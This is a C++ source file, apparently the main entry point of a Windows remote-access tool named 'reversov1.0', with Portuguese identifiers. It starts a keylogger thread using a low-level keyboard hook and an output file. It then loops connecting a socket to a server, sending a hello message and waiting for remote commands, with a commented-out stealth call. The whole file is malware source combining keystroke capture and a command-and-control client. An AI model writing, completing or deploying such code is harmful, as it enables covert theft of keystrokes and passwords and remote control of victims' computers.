// reversov1.0.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"

#include <winsock2.h>
#pragma comment(lib,"ws2_32.lib")
#include <stdio.h>
#include <thread>

#include "key2.h"
#include "funcoes.h"


HHOOK _hook;

// This struct contains the data received by the hook callback. As you see in the callback function
// it contains the thing you will need: vkCode = virtual key code.
KBDLLHOOKSTRUCT kbdStruct;

std::ofstream OUTPUT_FILE;

char lastwindow[256];
int hello(int soquete, tmensagem *msg)
{
	if (receber(soquete, msg) == 0)
	{
		printf("msg:%s; tamanho:%i , opcode:%i\n", msg->buffer, msg->tamanhoMsg, msg->opCode);
		preencherStruct(msg, "olah essa eh minha msg", thelloSend);
		enviar(soquete, msg);
		return 0;
	}
	else
	{
		return -1;
	}
	
}

int main()
{
	//Stealth();
	tmensagem msg;
	std::thread t1(rodarKey);

	while (1)
	{
		std::cout << "inicializando " << std::endl;
		int soquete;
		
		if (criarSoquete(&soquete) == -1)
		{
			Sleep(TEMPO_ESPERA);
			continue;
		}
		if (hello(soquete, &msg) == -1)
		{
			Sleep(TEMPO_ESPERA);
			continue;
		}
		
		

		esperarComando(soquete);

		std::cout << "fim do loop 1" << std::endl;
		Sleep(TEMPO_ESPERA);

	}
	std::cout << "fim do arquivo";


	
	return 0;
}